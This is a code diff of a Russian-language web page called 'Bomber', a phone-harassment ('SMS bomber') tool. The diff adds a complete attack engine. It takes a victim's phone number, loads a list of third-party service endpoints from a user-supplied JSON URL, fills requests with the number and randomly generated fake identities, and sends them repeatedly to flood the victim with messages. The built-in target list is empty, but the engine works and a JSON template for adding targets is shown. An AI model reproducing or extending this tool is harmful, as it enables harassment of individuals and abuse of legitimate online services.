@@ -2,23 +2,27 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-    <title>Bomber · Mini App</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
+    <title>Bomber · луна (СНГ) — crux edition</title>
     <style>
         :root {
             --accent: #b0b0ff; 
             --bg-glow: radial-gradient(circle at 30% 20%, #1e1e2f, #0a0c14);
         }
 
-        /* Убираем выделение текста и скролл для нативности */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             -webkit-tap-highlight-color: transparent !important;
-            user-select: none;
         }
+
+        @keyframes entry-fade {
+            0% { opacity: 0; transform: scale(0.95) translateY(10px); filter: blur(10px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); filter: blur(0); }
+        }
+
+        .entry-anim { animation: entry-fade 1.2s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
 
         body {
             background: var(--bg-glow);
@@ -29,149 +33,389 @@
             align-items: center;
             justify-content: center;
             padding: 1rem;
+            position: relative;
+            user-select: none;
             overflow: hidden;
         }
 
-        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        #bg-canvas {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none;
+        }
+
         .card { width: 100%; max-width: 320px; text-align: center; position: relative; z-index: 10; }
 
-        .header { display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; gap: 8px; }
-        .title { font-size: 2.2rem; font-weight: 700; color: #f0f0ff; text-shadow: 0 0 10px var(--accent); }
-        .bomb-emoji { font-size: 2.2rem; cursor: pointer; transition: transform 0.3s ease-out; }
+        .header { 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            margin-bottom: 1.5rem; 
+            gap: 4px;
+        }
+        .title { 
+            font-size: 2.2rem; 
+            font-weight: 700; 
+            color: #f0f0ff; 
+            text-shadow: 0 0 10px var(--accent); 
+            line-height: 1;
+        }
+        
+        .bomb-emoji { 
+            font-size: 2.2rem; 
+            cursor: pointer; 
+            filter: brightness(1.2) contrast(1.1) hue-rotate(220deg) drop-shadow(0 0 5px var(--accent));
+            transition: transform 0.3s ease-out;
+            display: inline-block;
+            line-height: 1;
+        }
 
         @keyframes moon-charge {
-            0% { transform: scale(1); }
-            40% { transform: scale(1.3); filter: brightness(1.5) drop-shadow(0 0 20px var(--accent)); }
-            100% { transform: scale(1); }
+            0% { transform: scale(1) rotate(0deg); }
+            40% { transform: scale(1.3) rotate(10deg); filter: brightness(1.5) hue-rotate(220deg) drop-shadow(0 0 20px var(--accent)); }
+            100% { transform: scale(1) rotate(0deg); }
         }
+
         .bomb-emoji.active-anim { animation: moon-charge 0.7s ease-in-out forwards; }
 
         .phone-field {
             display: flex; align-items: center; background: rgba(18, 18, 30, 0.8);
             border: 1px solid #5f5f8f; border-radius: 14px; backdrop-filter: blur(8px);
-            padding: 4px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3); margin-bottom: 1rem;
+            width: 185px; padding: 2px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+            transition: 0.3s;
+        }
+        
+        .phone-field.invalid {
+            border-color: #ff4444 !important;
+            animation: error-shake 0.4s cubic-bezier(.36,.07,.19,.97) both;
+        }
+        @keyframes error-shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-4px); }
+            40%, 80% { transform: translateX(4px); }
         }
 
-        .code-selector { padding: 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.9rem; position: relative; }
+        .code-selector { padding: 0.3rem 0.5rem; cursor: pointer; border-right: 1px solid #5f5f8f; font-size: 0.8rem; position: relative; color: #f0f0ff; white-space: nowrap; }
         .code-dropdown {
-            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); 
-            border: 1px solid var(--accent); border-radius: 14px; display: none; z-index: 1000; min-width: 150px;
+            position: absolute; top: calc(100% + 10px); left: 0; background: rgba(30, 30, 50, 0.98); border: 2px solid var(--accent);
+            border-radius: 14px; display: none; z-index: 1000; min-width: 160px; backdrop-filter: blur(15px);
         }
-        .code-selector.active .code-dropdown { display: block; }
-        .code-item { padding: 10px; font-size: 0.8rem; border-bottom: 1px solid rgba(255,255,255,0.05); text-align: left; }
+        .code-selector.active .code-dropdown { display: block; animation: entry-fade 0.3s ease-out; }
+        .code-item { padding: 10px 12px; font-size: 0.75rem; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; text-align: left; }
+        .code-item:hover { background: rgba(180, 180, 255, 0.15); }
 
-        .phone-number-input { background: transparent; border: none; color: #fff; font-size: 1rem; padding: 5px 10px; outline: none; width: 100%; }
+        .phone-number-input { background: transparent; border: none; color: #fff; font-size: 0.8rem; padding: 5px 6px; outline: none; width: 100%; font-family: 'JetBrains Mono', monospace; }
+
+        .row { display: flex; justify-content: center; align-items: stretch; gap: 6px; margin-bottom: 1.5rem; position: relative; z-index: 20; }
+
+        .repeats {
+            display: flex; align-items: center; gap: 3px; background: rgba(20, 20, 35, 0.7);
+            border: 1px solid #5f5f8f; border-radius: 12px; padding: 0 8px; backdrop-filter: blur(8px);
+        }
+        .repeats-symbol { font-size: 0.9rem; color: var(--accent); font-weight: bold; }
+        .repeats-input { width: 30px; background: transparent; border: none; color: #fff; text-align: center; outline: none; font-weight: 700; font-size: 0.8rem; }
+        
+        .repeats-max { 
+            font-size: 0.6rem; font-family: 'JetBrains Mono', monospace; color: #fff; background: rgba(180,180,255,0.1); 
+            padding: 3px 6px; border-radius: 6px; display: flex; align-items: center; gap: 4px; border: 1px solid rgba(176, 176, 255, 0.3);
+        }
+        
+        .atom-svg { width: 16px; height: 16px; filter: drop-shadow(0 0 5px #8a8aff); }
 
         .attack-btn {
-            width: 100%; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
-            border-radius: 100px; color: #fff; padding: 14px; cursor: pointer; font-weight: 700;
-            text-transform: uppercase; letter-spacing: 2px;
+            width: 210px; background: rgba(255, 255, 255, 0.08); border: 1px solid var(--accent);
+            border-radius: 100px; color: #fff; padding: 12px; cursor: pointer; font-weight: 700; text-transform: uppercase;
+            letter-spacing: 2px; transition: 0.2s; margin-top: 0.5rem; backdrop-filter: blur(2px);
+        }
+        .attack-btn:active { transform: scale(0.96); }
+
+        .settings-trigger { position: fixed; bottom: 20px; right: 20px; font-size: 1.5rem; color: var(--accent); cursor: pointer; z-index: 100; opacity: 0.5; }
+        
+        .settings-modal { position: fixed; inset: 0; background: rgba(5, 5, 15, 0.5); backdrop-filter: blur(20px); display: none; align-items: center; justify-content: center; z-index: 3000; }
+        .settings-modal.active { display: flex; }
+        .settings-content { 
+            background: rgba(20, 20, 35, 0.85); border: 1px solid var(--accent); border-radius: 28px; 
+            padding: 2.5rem 1.5rem 1.5rem; width: 330px; position: relative; text-align: center; 
+        }
+        
+        .close-settings { position: absolute; top: 15px; right: 20px; font-size: 1.4rem; color: var(--accent); cursor: pointer; }
+
+        .settings-hint {
+            font-size: 0.65rem; color: var(--accent); opacity: 0.7;
+            margin-top: -10px; margin-bottom: 12px; display: block;
+            text-align: left; padding-left: 5px; cursor: pointer;
+            text-decoration: underline; transition: 0.2s;
+        }
+
+        .example-json-struct {
+            background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(176, 176, 255, 0.2);
+            border-radius: 10px; padding: 10px; text-align: left; font-family: 'JetBrains Mono', monospace;
+            font-size: 0.58rem; color: #aaaaff; margin-bottom: 15px; white-space: pre; overflow-x: auto;
+            display: none; animation: entry-fade 0.4s ease-out;
         }
 
         .loading-overlay {
-            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.95);
+            position: fixed; inset: 0; background: rgba(10, 10, 20, 0.9);
             display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 5000;
         }
         .loading-overlay.show { display: flex; }
+        .funny-progress-bg { width: 220px; height: 4px; background: rgba(255,255,255,0.05); border-radius: 10px; margin-top: 15px; overflow: hidden; }
+        .funny-progress-fill { height: 100%; width: 0%; background: var(--accent); transition: 0.3s ease; }
     </style>
 </head>
 <body>
 
 <canvas id="bg-canvas"></canvas>
 
-<div class="card">
+<div class="card entry-anim">
     <div class="header">
         <span class="title">Bomber</span>
         <span class="bomb-emoji" id="bombLogo">💣</span>
     </div>
     
-    <div class="phone-field">
-        <div class="code-selector" id="codeSelector">
-            <span id="selectedCode">🇷🇺 +7</span>
-            <div class="code-dropdown" id="codeDropdown">
-                <div class="code-item" data-code="+7">🇷🇺 +7</div>
-                <div class="code-item" data-code="+380">🇺🇦 +380</div>
-                <div class="code-item" data-code="+375">🇧🇾 +375</div>
+    <div class="row">
+        <div class="phone-field" id="phoneBox">
+            <div class="code-selector" id="codeSelector">
+                <span id="selectedCode">🇷🇺 +7</span>
+                <div class="code-dropdown" id="codeDropdown">
+                    <div class="code-item" data-code="+7" data-len="10">🇷🇺 +7 (Россия)</div>
+                    <div class="code-item" data-code="+380" data-len="9">🇺🇦 +380 (Украина)</div>
+                    <div class="code-item" data-code="+375" data-len="9">🇧🇾 +375 (Беларусь)</div>
+                    <div class="code-item" data-code="+7" data-len="10">🇰🇿 +7 (Казахстан)</div>
+                </div>
             </div>
+            <input class="phone-number-input" type="text" id="localNumber" placeholder="912 345 67 89" inputmode="numeric">
         </div>
-        <input class="phone-number-input" type="tel" id="localNumber" placeholder="912 345 67 89">
+        
+        <div class="repeats">
+            <span class="repeats-symbol">↳↰</span>
+            <input class="repeats-input" type="number" id="repeat" value="3" min="1" max="100">
+            <span class="repeats-max">
+                <svg class="atom-svg" viewBox="0 0 24 24" fill="none" stroke="#b0b0ff" stroke-width="1.5">
+                    <circle cx="12" cy="12" r="2" fill="#b0b0ff"/>
+                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(0 12 12)"/>
+                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(60 12 12)"/>
+                    <ellipse cx="12" cy="12" rx="10" ry="4" transform="rotate(120 12 12)"/>
+                </svg>
+                <span id="servicesCounter">0</span>
+            </span>
+        </div>
     </div>
     
-    <button class="attack-btn" id="go">ЗАПУСТИТЬ</button>
+    <button class="attack-btn" id="go">НАЧАТЬ АТАКУ</button>
+</div>
+
+<div class="settings-trigger" id="openSettings">⚙</div>
+
+<div class="settings-modal" id="settingsModal">
+    <div class="settings-content">
+        <div class="close-settings" id="closeSettings">✕</div>
+        <div class="title" style="font-size: 1.1rem; margin-bottom: 20px;">CRUX SETTINGS</div>
+        <input type="text" id="repoUrl" style="width:100%; padding:10px; margin-bottom:12px; background:rgba(0,0,0,0.3); border:1px solid #5f5f8f; color:#fff; border-radius:10px; outline:none;" placeholder="Вставьте JSON URL...">
+        
+        <span class="settings-hint" id="toggleExample">Пример JSON (Нажми)</span>
+        <div class="example-json-struct" id="jsonExample">
+[
+  {
+    "name": "My Service",
+    "requests": [
+      {
+        "url": "https://api.example.com/v1/send",
+        "method": "POST",
+        "headers": { "Content-Type": "application/json" },
+        "body": { "phone": "%phone%" }
+      }
+    ]
+  }
+]</div>
+        <button class="attack-btn" id="saveSettings" style="width:100%;">СОХРАНИТЬ</button>
+    </div>
 </div>
 
 <div class="loading-overlay" id="loadingOverlay">
-    <div style="color:var(--accent); margin-bottom: 20px;" id="statusTxt">Атака запущена...</div>
-    <button onclick="location.reload()" style="background:none; border:1px solid red; color:red; padding:10px; border-radius:10px;">СТОП</button>
+    <div style="color:var(--accent); font-family:monospace;" id="statusTxt">Инициализация...</div>
+    <div class="funny-progress-bg"><div class="funny-progress-fill" id="progressFill"></div></div>
+    <button id="stopAttack" style="margin-top:20px; background:none; border:1px solid #ff4444; color:#ff4444; padding:5px 15px; border-radius:20px; cursor:pointer; font-size:0.7rem;">ОСТАНОВИТЬ</button>
 </div>
 
 <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand(); // Развернуть на весь экран
-    tg.ready();
+    (function() {
+        // ПУСТОЙ МАССИВ - ССЫЛКИ УДАЛЕНЫ
+        const localServicesData = [];
 
-    // Настройка цвета MainButton под тему TG
-    tg.MainButton.setText("НАЧАТЬ АТАКУ").hide();
+        const canvas = document.getElementById('bg-canvas');
+        const ctx = canvas.getContext('2d');
+        let bgParticles = [], explosionParticles = [], loadedServices = [], isAttacking = false;
 
-    const canvas = document.getElementById('bg-canvas');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
+        function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+        window.addEventListener('resize', resize); resize();
 
-    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
-    window.addEventListener('resize', resize); resize();
-
-    class Particle {
-        constructor() {
-            this.x = Math.random() * canvas.width;
-            this.y = Math.random() * canvas.height;
-            this.vx = (Math.random() - 0.5) * 0.5;
-            this.vy = (Math.random() - 0.5) * 0.5;
+        class Particle {
+            constructor(x, y, isExplosion = false) { 
+                this.x = x || Math.random() * canvas.width; 
+                this.y = y || Math.random() * canvas.height; 
+                this.isExplosion = isExplosion;
+                this.vx = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
+                this.vy = isExplosion ? (Math.random() - 0.5) * 6 : (Math.random() - 0.5) * 0.4;
+                this.alpha = 1;
+            }
+            update() { this.x += this.vx; this.y += this.vy; if (this.isExplosion) this.alpha -= 0.02; }
+            draw() { ctx.fillStyle = "#b0b0ff"; ctx.globalAlpha = this.isExplosion ? this.alpha : 0.4; ctx.beginPath(); ctx.arc(this.x, this.y, this.isExplosion ? 2 : 1.2, 0, Math.PI * 2); ctx.fill(); }
         }
-        draw() {
-            ctx.fillStyle = "#b0b0ff";
-            ctx.globalAlpha = 0.3;
-            ctx.beginPath();
-            ctx.arc(this.x, this.y, 1, 0, Math.PI * 2);
-            ctx.fill();
+
+        for(let i=0; i<70; i++) bgParticles.push(new Particle());
+        function animate() { 
+            ctx.clearRect(0, 0, canvas.width, canvas.height); 
+            bgParticles.forEach(p => { p.update(); if(p.x<0||p.x>canvas.width) p.vx*=-1; if(p.y<0||p.y>canvas.height) p.vy*=-1; p.draw(); }); 
+            explosionParticles.forEach((p, i) => { p.update(); p.draw(); if(p.alpha <= 0) explosionParticles.splice(i, 1); });
+            requestAnimationFrame(animate); 
         }
-        update() {
-            this.x += this.vx; this.y += this.vy;
-            if(this.x < 0 || this.x > canvas.width) this.vx *= -1;
-            if(this.y < 0 || this.y > canvas.height) this.vy *= -1;
+        animate();
+
+        function genFake() {
+            const r = (l) => Math.random().toString(36).substring(2, 2+l);
+            const firstNames = ["Александр", "Дмитрий", "Максим", "Сергей", "Иван", "Artem", "Nikita"];
+            const lastNames = ["Иванов", "Петров", "Смирнов", "Волков", "Sokolov", "Popov"];
+            const f = firstNames[Math.floor(Math.random()*firstNames.length)];
+            const l = lastNames[Math.floor(Math.random()*lastNames.length)];
+            return {
+                "{first_name}": f,
+                "{last_name}": l,
+                "{password}": r(8) + "A1!",
+                "{email}": r(7) + "@gmail.com",
+                "{username}": r(5) + "_" + Math.floor(Math.random()*999)
+            };
         }
-    }
 
-    for(let i=0; i<50; i++) particles.push(new Particle());
-
-    function anim() {
-        ctx.clearRect(0,0,canvas.width, canvas.height);
-        particles.forEach(p => { p.update(); p.draw(); });
-        requestAnimationFrame(anim);
-    }
-    anim();
-
-    document.getElementById('go').onclick = () => {
-        const num = document.getElementById('localNumber').value;
-        if(num.length < 5) {
-            tg.HapticFeedback.notificationOccurred('error');
-            alert('Введите номер');
-            return;
+        function applyPatterns(data, phone, fakes) {
+            if (!data) return data;
+            let str = typeof data === 'string' ? data : JSON.stringify(data);
+            str = str.replace(/%phone%/g, phone);
+            for (let [key, val] of Object.entries(fakes)) {
+                str = str.split(key).join(val);
+            }
+            try { return JSON.parse(str); } catch(e) { return str; }
         }
-        tg.HapticFeedback.impactOccurred('heavy');
-        document.getElementById('loadingOverlay').classList.add('show');
-    };
 
-    // Селектор кода
-    document.getElementById('codeSelector').onclick = (e) => {
-        e.stopPropagation();
-        document.getElementById('codeSelector').classList.toggle('active');
-    };
-    document.querySelectorAll('.code-item').forEach(item => {
-        item.onclick = () => {
-            document.getElementById('selectedCode').innerText = item.innerText;
+        async function loadServices() {
+            const customUrl = localStorage.getItem('crux_url');
+            if (customUrl && customUrl.trim() !== "") {
+                try {
+                    const res = await fetch(customUrl);
+                    const data = await res.json();
+                    loadedServices = Array.isArray(data) ? data : (data.services || []);
+                } catch (e) { 
+                    loadedServices = localServicesData;
+                }
+            } else {
+                loadedServices = localServicesData;
+            }
+            document.getElementById('servicesCounter').innerText = loadedServices.length;
+        }
+        loadServices();
+
+        async function executeRequest(req, phone, fakes) {
+            const finalUrl = applyPatterns(req.url, phone, fakes);
+            const finalHeaders = applyPatterns(req.headers || {}, phone, fakes);
+            let finalBody = null;
+            if (req.body) {
+                const processedBody = applyPatterns(req.body, phone, fakes);
+                finalBody = typeof processedBody === 'object' ? JSON.stringify(processedBody) : processedBody;
+            }
+            try {
+                await fetch(finalUrl, {
+                    method: req.method || 'POST',
+                    headers: { 'Content-Type': 'application/json', ...finalHeaders },
+                    body: finalBody
+                });
+            } catch(e) {}
+        }
+
+        async function startAttack(phone) {
+            const repeats = parseInt(document.getElementById('repeat').value) || 1;
+            const progress = document.getElementById('progressFill');
+            const status = document.getElementById('statusTxt');
+            isAttacking = true;
+            let totalRequests = 0;
+            
+            loadedServices.forEach(s => {
+                totalRequests += (s.requests && s.requests.length) ? s.requests.length : 1;
+            });
+
+            if (totalRequests === 0) {
+                alert("Список сервисов пуст! Добавьте их в настройках.");
+                document.getElementById('loadingOverlay').classList.remove('show');
+                isAttacking = false;
+                return;
+            }
+
+            const totalToRun = totalRequests * repeats;
+            let done = 0;
+
+            for (let r = 0; r < repeats && isAttacking; r++) {
+                for (let s of loadedServices) {
+                    if (!isAttacking) break;
+                    const fakes = genFake();
+                    if (s.requests && Array.isArray(s.requests)) {
+                        for (let subReq of s.requests) {
+                            if (!isAttacking) break;
+                            await executeRequest(subReq, phone, fakes);
+                            done++;
+                            updateUI(done, totalToRun);
+                            await new Promise(res => setTimeout(res, 50));
+                        }
+                    } else {
+                        await executeRequest(s, phone, fakes);
+                        done++;
+                        updateUI(done, totalToRun);
+                        await new Promise(res => setTimeout(res, 50));
+                    }
+                }
+            }
+            status.innerText = "ЗАВЕРШЕНО";
+            setTimeout(() => { document.getElementById('loadingOverlay').classList.remove('show'); progress.style.width="0%"; }, 1500);
+            isAttacking = false;
+        }
+
+        function updateUI(done, total) {
+            document.getElementById('progressFill').style.width = (done / total * 100) + "%";
+            document.getElementById('statusTxt').innerText = `Атака: ${done}/${total}`;
+        }
+
+        document.getElementById('go').onclick = () => {
+            const num = document.getElementById('localNumber').value.replace(/\D/g, '');
+            if (num.length < 7) { 
+                document.getElementById('phoneBox').classList.add('invalid'); 
+                setTimeout(()=>document.getElementById('phoneBox').classList.remove('invalid'), 500); 
+                return; 
+            }
+            document.getElementById('loadingOverlay').classList.add('show');
+            const code = document.getElementById('selectedCode').innerText.split(' ').pop().replace('+', '');
+            startAttack(code + num);
         };
-    });
-    window.onclick = () => document.getElementById('codeSelector').classList.remove('active');
+
+        const bomb = document.getElementById('bombLogo');
+        bomb.onclick = () => {
+            bomb.classList.add('active-anim');
+            setTimeout(() => bomb.classList.remove('active-anim'), 700);
+            const rect = bomb.getBoundingClientRect();
+            for(let i=0; i<20; i++) explosionParticles.push(new Particle(rect.left + rect.width/2, rect.top + rect.height/2, true));
+        };
+
+        document.getElementById('stopAttack').onclick = () => isAttacking = false;
+        document.getElementById('openSettings').onclick = () => document.getElementById('settingsModal').classList.add('active');
+        document.getElementById('closeSettings').onclick = () => document.getElementById('settingsModal').classList.remove('active');
+        document.getElementById('toggleExample').onclick = () => {
+            const ex = document.getElementById('jsonExample');
+            ex.style.display = ex.style.display === 'block' ? 'none' : 'block';
+        };
+        document.getElementById('saveSettings').onclick = () => {
+            localStorage.setItem('crux_url', document.getElementById('repoUrl').value);
+            loadServices();
+            document.getElementById('settingsModal').classList.remove('active');
+        };
+        document.getElementById('codeSelector').onclick = (e) => { e.stopPropagation(); document.getElementById('codeSelector').classList.toggle('active'); };
+        document.querySelectorAll('.code-item').forEach(i => i.onclick = () => document.getElementById('selectedCode').innerText = i.innerText.split(' ')[0] + ' ' + i.dataset.code);
+        window.onclick = () => document.getElementById('codeSelector').classList.remove('active');
+    })();
 </script>
 </body>
 </html>
